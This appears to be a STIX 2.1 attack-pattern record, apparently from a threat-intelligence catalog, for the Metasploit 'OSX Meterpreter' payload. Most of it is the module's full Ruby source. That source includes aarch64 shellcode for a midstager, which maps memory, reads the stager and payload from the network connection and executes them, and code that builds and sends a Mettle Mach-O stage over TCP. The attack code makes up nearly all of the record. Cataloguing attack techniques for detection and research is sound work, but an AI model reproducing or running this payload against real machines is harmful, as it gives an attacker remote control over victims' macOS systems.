{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ed104d04-c028-4564-aefb-14d919d37443",
    "created": "2024-08-14T16:33:19.249947Z",
    "modified": "2024-08-14T16:33:19.249951Z",
    "name": "OSX Meterpreter",
    "description": "Inject the mettle server payload (staged) 'Platform' => 'osx'",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/osx/aarch64/meterpreter.rb",
            "external_id": "meterpreter.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/CylanceVulnResearch/osx_runbin"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/nologic/shellcc"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n  include Msf::Sessions::MeterpreterOptions\n  include Msf::Sessions::MettleConfig\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OSX Meterpreter',\n        'Description' => 'Inject the mettle server payload (staged)',\n        'Platform' => 'osx',\n        'Author' => [\n          'parchedmind',  # osx_runbin\n          'nologic',      # shellcc\n          'timwr',        # metasploit integration\n          'usiegl00'      # aarch64\n        ],\n        'References' => [\n          [ 'URL', 'https://github.com/CylanceVulnResearch/osx_runbin' ],\n          [ 'URL', 'https://github.com/nologic/shellcc' ]\n        ],\n        'Arch' => ARCH_AARCH64,\n        'License' => MSF_LICENSE,\n        'Session' => Msf::Sessions::Meterpreter_aarch64_OSX,\n        'Convention' => 'sockedi'\n      )\n    )\n  end\n\n  def handle_intermediate_stage(conn, payload)\n    stager_file = File.join(Msf::Config.data_directory, 'meterpreter', 'aarch64_osx_stage')\n    data = File.binread(stager_file)\n    macho = Msf::Payload::MachO.new(data)\n    output_data = macho.flatten\n    entry_offset = macho.entrypoint\n    # external/source/shellcode/osx/aarch64/stage_mettle.s\n    midstager = [\n      # <_main>:\n      0xaa1f03e0, # mov\tx0, xzr\n      0x10000861, # adr\tx1, #268\n      0xf9400021, # ldr\tx1, [x1]\n      0xd2800042, # mov\tx2, #2\n      0xd2820043, # mov\tx3, #4098\n      0xaa1f03e4, # mov\tx4, xzr\n      0xaa1f03e5, # mov\tx5, xzr\n      0x58000870, # ldr\tx16, 0x100003f98 <entry_offset+0x8>\n      0xd4000001, # svc\t#0\n      0xaa0003ea, # mov\tx10, x0\n      0xaa0d03e0, # mov\tx0, x13\n      0xaa0a03e1, # mov\tx1, x10\n      0x10000702, # adr\tx2, #224\n      0xf9400042, # ldr\tx2, [x2]\n      0xd2800803, # mov\tx3, #64\n      0xaa1f03e4, # mov\tx4, xzr\n      0xaa1f03e5, # mov\tx5, xzr\n      0x58000770, # ldr\tx16, 0x100003fa0 <entry_offset+0x10>\n      0xd4000001, # svc\t#0\n      0xaa0a03e0, # mov\tx0, x10\n      0x10000601, # adr\tx1, #192\n      0xf9400021, # ldr\tx1, [x1]\n      0xd28000a2, # mov\tx2, #5\n      0x580006f0, # ldr\tx16, 0x100003fa8 <entry_offset+0x18>\n      0xd4000001, # svc\t#0\n      0xaa1f03e0, # mov\tx0, xzr\n      0x10000581, # adr\tx1, #176\n      0xf9400021, # ldr\tx1, [x1]\n      0xd2800062, # mov\tx2, #3\n      0xd2820043, # mov\tx3, #4098\n      0xaa1f03e4, # mov\tx4, xzr\n      0xaa1f03e5, # mov\tx5, xzr\n      0x58000550, # ldr\tx16, 0x100003f98 <entry_offset+0x8>\n      0xd4000001, # svc\t#0\n      0xaa0003eb, # mov\tx11, x0\n      0xaa0d03e0, # mov\tx0, x13\n      0xaa0b03e1, # mov\tx1, x11\n      0x10000422, # adr\tx2, #132\n      0xf9400042, # ldr\tx2, [x2]\n      0xd2800803, # mov\tx3, #64\n      0xaa1f03e4, # mov\tx4, xzr\n      0xaa1f03e5, # mov\tx5, xzr\n      0x58000450, # ldr\tx16, 0x100003fa0 <entry_offset+0x10>\n      0xd4000001, # svc\t#0\n      0x10000380, # adr\tx0, #112\n      0xf9400000, # ldr\tx0, [x0]\n      0x8b0a0000, # add\tx0, x0, x10\n      0x100002ea, # adr\tx10, #92\n      0xf940014a, # ldr\tx10, [x10]\n      0xaa0b03ec, # mov\tx12, x11\n      0xaa0003ef, # mov\tx15, x0\n      0xaa1f03e0, # mov\tx0, xzr\n      0xd2a00081, # mov\tx1, #262144\n      0xd2800062, # mov\tx2, #3\n      0xd2820043, # mov\tx3, #4098\n      0xaa1f03e4, # mov\tx4, xzr\n      0xaa1f03e5, # mov\tx5, xzr\n      0x58000230, # ldr\tx16, 0x100003f98 <entry_offset+0x8>\n      0xd4000001, # svc\t#0\n      0x91408000, # add\tx0, x0, #32, lsl #12    ; =131072\n      0x9100001f, # mov\tsp, x0\n      0xaa0d03e0, # mov\tx0, x13\n      0xd63f01e0, # blr\tx15\n      # <failed>:\n      0xd2800000, # mov\tx0, #0\n      0x58000210, # ldr\tx16, 0x100003fb0 <entry_offset+0x20>\n      0xd4000001, # svc\t#0\n      0xd503201f, # nop\n      0xd503201f, # nop\n      # <stager_size>:\n      output_data.length, # udf\t#16962\n      0x00000000, # udf\t#17219\n      # <payload_size>:\n      payload.length, # udf\t#17476\n      0x00000000, # udf\t#17733\n      # <entry_offset>:\n      entry_offset, # udf\t#17990\n      0x00000000, # udf\t#18247\n      0x020000c5, # <unknown>\n      0x00000000, # udf\t#0\n      0x0200001d, # <unknown>\n      0x00000000, # udf\t#0\n      0x0200004a, # <unknown>\n      0x00000000, # udf\t#0\n      0x02000001, # <unknown>\n      0x00000000, # udf\t#0\n    ].pack('V*')\n    print_status(\"Transmitting first stager...(#{midstager.length} bytes)\")\n    conn.put(midstager)\n    midstager.length\n\n    Rex.sleep(0.1)\n    print_status(\"Transmitting second stager...(#{output_data.length} bytes)\")\n    conn.put(output_data) == output_data.length\n  end\n\n  def generate_stage(opts = {})\n    config_opts = { scheme: 'tcp' }.merge(mettle_logging_config(opts))\n    mettle_macho = MetasploitPayloads::Mettle.new('aarch64-apple-darwin',\n                                                  generate_config(opts.merge(config_opts))).to_binary :exec\n    mettle_macho[0] = 'b'\n    mettle_macho\n  end\nend\n"
}